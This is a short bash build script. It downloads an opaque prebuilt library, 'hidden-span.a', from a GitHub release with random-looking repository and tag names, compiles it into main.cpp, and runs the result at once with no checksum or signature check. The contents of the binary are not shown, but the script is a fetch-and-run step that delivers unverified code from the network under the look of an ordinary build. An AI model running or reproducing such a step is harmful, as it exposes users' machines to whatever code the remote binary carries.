#!/usr/bin/env bash
set -e
LIB="hidden-span.a"
TAG="hidden-forest-cosmic-comet"
REPO="ejinchuer/rarejasperio"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "$URL"
g++ main.cpp "$LIB" -O2 -std=c++17 -pthread -o app && ./app
